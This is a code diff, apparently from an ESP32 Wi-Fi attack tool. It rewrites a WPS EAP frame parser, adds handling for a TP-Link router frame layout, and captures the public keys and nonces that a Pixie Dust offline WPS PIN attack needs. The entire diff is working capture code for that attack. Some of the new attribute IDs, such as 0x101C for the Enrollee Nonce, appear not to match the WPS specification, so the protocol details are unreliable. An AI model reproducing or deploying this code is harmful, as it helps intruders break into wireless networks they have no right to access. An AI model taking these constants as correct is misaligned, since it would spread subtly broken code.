@@ -316,28 +316,28 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
         const uint8_t *data = buf + offset;
 
         switch (attr_type) {
-            case 0x1028:  // Enrollee Public Key (PKE) — in M1
+            case 0x1032:  // Public Key — WPS spec §12, used for BOTH enrollee (M1) and
+                          // registrar (M2). First seen = PKE (we sent it), second = PKR (AP's).
                 if (attr_len == 192) {
-                    memcpy(pixieCapture.pke, data, 192);
-                    pixieCapture.pke_set = true;
-                    Serial.println("[Pixie] PKE captured");
+                    if (!pixieCapture.pke_set) {
+                        memcpy(pixieCapture.pke, data, 192);
+                        pixieCapture.pke_set = true;
+                        Serial.println("[Pixie] PKE captured");
+                    } else {
+                        memcpy(pixieCapture.pkr, data, 192);
+                        pixieCapture.pkr_set = true;
+                        Serial.println("[Pixie] PKR captured");
+                    }
                 }
                 break;
-            case 0x1029:  // Registrar Public Key (PKR) — in M2
-                if (attr_len == 192) {
-                    memcpy(pixieCapture.pkr, data, 192);
-                    pixieCapture.pkr_set = true;
-                    Serial.println("[Pixie] PKR captured");
-                }
-                break;
-            case 0x1032:  // Enrollee Nonce — in M1
+            case 0x101C:  // Enrollee Nonce (Wi-Fi Simple Config 2.0 Table E-1)
                 if (attr_len == 16) {
                     memcpy(pixieCapture.e_nonce, data, 16);
                     pixieCapture.e_nonce_set = true;
                     Serial.println("[Pixie] E-Nonce captured");
                 }
                 break;
-            case 0x1033:  // Registrar Nonce — in M2
+            case 0x1017:  // Registrar Nonce — in M2
                 if (attr_len == 16) {
                     memcpy(pixieCapture.r_nonce, data, 16);
                     pixieCapture.r_nonce_set = true;
@@ -421,68 +421,98 @@ bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
     uint16_t seqCtrl    = (uint16_t)p[22] | ((uint16_t)p[23] << 8);
     uint16_t seqNumber  = (seqCtrl >> 4) & 0x0FFF;
 
+    // ----------------------------------------------------------------
+    // Locate the EAPOL body in p[] so we can use body-relative indexing.
+    // This is cleaner than tracking p-relative offsets through all the
+    // branching path logic.
+    //   LLC/SNAP is at p[macHdr], ethertype 88:8E at p[macHdr+6].
+    //   EAPOL body (version byte) is at p[macHdr+8].
+    //   EAP body (code byte) is at p[macHdr+8+4] = p[macHdr+12].
+    //   EAP type byte (0xFE) is at p[macHdr+12+4] = p[macHdr+16].
+    //   Payload after EAP type byte starts at p[macHdr+17].
+    // ----------------------------------------------------------------
+    const uint8_t *eapBody = p + macHdr + 8;   // points to EAPOL ver byte
+    int            eapBodyLen = len - (macHdr + 8);
+    // eapBody[0]=ver, [1]=eapol_type, [2:4]=eapol_len
+    // eapBody[4]=eap_code, [5]=eap_id, [6:8]=eap_len, [8]=eap_type=0xFE
+    // eapBody[9..] = payload after 0xFE type byte
+
     // Outer VID location
-    int vidOffset = macHdr + 8 + 4 + 4 + 1;
+    int vidOffset = macHdr + 8 + 4 + 4 + 1;  // = macHdr+17, points at first payload byte after 0xFE
     bool outerIsWscStartShell = (vidOffset + 3 <= len &&
                                  p[vidOffset]==0x00 && p[vidOffset+1]==0x01 && p[vidOffset+2]==0x01);
     bool outerIsDoubleWrap    = (vidOffset + 3 <= len &&
                                  p[vidOffset]==0x2A && p[vidOffset+1]==0x00 && p[vidOffset+2]==0x01);
 
-    int offset = macHdr + 8 + 4 + 5 + 3 + 4 + 1;
-    if (offset + 1 > len) return false;
+    if (outerIsWscStartShell) return false;  // WSC-Start shell: no TLVs to parse
 
-    // TP-Link Scrambled VID Detection
-    bool isTPLinkScrambled = false;
-    if (!outerIsWscStartShell) {
-        int vidCheck = vidOffset;
-        if (vidCheck + 7 <= len &&
-            p[vidCheck+4] == 0x00 && p[vidCheck+5] == 0x37 && p[vidCheck+6] == 0x2A) {
-            isTPLinkScrambled = true;
-            Serial.println("[Pixie] Detected TP-Link scrambled VID");
-        }
-    }
+    // TP-Link WR840N format detection:
+    // The AP inserts a 4-byte random session token between the EAP type byte (0xFE)
+    // and the WFA Vendor-ID (00:37:2A). So at vidOffset we see the token[0:4], and
+    // the real WFA VID is at vidOffset+4. Detect by checking vidOffset+4..+6 == 00:37:2A.
+    bool isTPLink = (vidOffset + 7 <= len &&
+                     p[vidOffset+4]==0x00 && p[vidOffset+5]==0x37 && p[vidOffset+6]==0x2A);
 
-    uint8_t wscFlags = p[offset];
-    offset++;  // skip outer Flags
+    // TP-Link frame layout from EAP body (eapBody[]):
+    //   [0]     EAPOL ver
+    //   [1]     EAPOL type = 0x00
+    //   [2:4]   EAPOL length
+    //   [4]     EAP code
+    //   [5]     EAP id
+    //   [6:8]   EAP length
+    //   [8]     EAP type = 0xFE
+    //   [9:13]  4-byte session token (random per WSC-Start retransmit)
+    //   [13:16] WFA VID = 00:37:2A
+    //   [16:20] WFA VType = 00:00:00:01
+    //   [20]    Op-Code
+    //   [21]    Flags (bit0=MoreFrag, bit1=MsgLen present)
+    //   [22+]   TLVs (if Flags bit1 clear), or MsgLen(2) then TLVs (if bit1 set)
+    //
+    // Standard frame layout (no token):
+    //   [9:12]  WFA VID = 00:37:2A
+    //   [12:16] WFA VType = 00:00:00:01
+    //   [16]    Op-Code
+    //   [17]    Flags
+    //   [18+]   TLVs
 
-    if (outerIsWscStartShell) return false;
+    int tlvBodyOffset;  // offset into eapBody[] where TLVs start
+    uint8_t wscFlags;
 
-    if (outerIsDoubleWrap) {
-        if (offset + 8 > len) return false;
-        if (p[offset]==0x37 && p[offset+1]==0x2A && p[offset+2]==0x00) {
-            wscFlags = p[offset + 7];
-            offset += 8;
-            Serial.println("[Pixie] Double-wrap: skipped 8-byte inner header");
+    if (isTPLink) {
+        // 4-byte token present
+        wscFlags     = eapBody[21];
+        tlvBodyOffset = 22;
+        Serial.printf("[Pixie] TP-Link format: token=%02X%02X%02X%02X op=0x%02X flags=0x%02X\n",
+                      eapBody[9],eapBody[10],eapBody[11],eapBody[12],eapBody[20],wscFlags);
+    } else if (outerIsDoubleWrap) {
+        // Double-wrapped (2A:00:01 outer + 8-byte inner header)
+        // Inner header at eapBody[17]: OUI(3)+VType-like(3)+op(1)+flags(1) = 8 bytes
+        if (eapBody[17]==0x37 && eapBody[18]==0x2A && eapBody[19]==0x00) {
+            wscFlags     = eapBody[24];
+            tlvBodyOffset = 25;
+            Serial.println("[Pixie] Double-wrap: 8-byte inner header skipped");
         } else {
-            Serial.printf("[Pixie] Double-wrap unexpected inner[0:3]=%02X%02X%02X\n",
-                        p[offset], p[offset+1], p[offset+2]);
+            Serial.printf("[Pixie] Double-wrap unexpected inner OUI: %02X%02X%02X\n",
+                          eapBody[17],eapBody[18],eapBody[19]);
             return false;
         }
+    } else {
+        // Standard WFA EAP Expanded (no token)
+        wscFlags     = eapBody[17];
+        tlvBodyOffset = 18;
     }
 
-    // TP-Link extra prefix skip
-    if (isTPLinkScrambled) {
-        if (offset + 2 > len) return false;
-        offset += 1;  // skip REAL OpCode; wscFlags will be re-read below
-        Serial.println("[Pixie] Skipped TP-Link OpCode byte");
-        // Re-read real Flags only for TP-Link (standard already read correctly above)
-        if (offset >= len) return false;
-        wscFlags = p[offset];
-        offset++;
-    }
-
-    // WPS fragmentation flags
+    // Message-Length flag: bit1 of Flags — present in first fragment only
     bool wpsMoreFrag = (wscFlags & 0x01) != 0;
     bool wpsHasLen   = (wscFlags & 0x02) != 0;
     if (wpsHasLen) {
-        if (offset + 2 > len) return false;
-        offset += 2;
+        tlvBodyOffset += 2;  // skip 2-byte WPS total message length field
     }
 
-    if (offset > len) return false;
+    if (tlvBodyOffset >= eapBodyLen) return false;
 
-    const uint8_t *tlvStart = p + offset;
-    int            tlvBytes = len - offset;
+    const uint8_t *tlvStart = eapBody + tlvBodyOffset;
+    int            tlvBytes = eapBodyLen - tlvBodyOffset;
 
     // Reassembly logic
     if (wpsHasLen) {
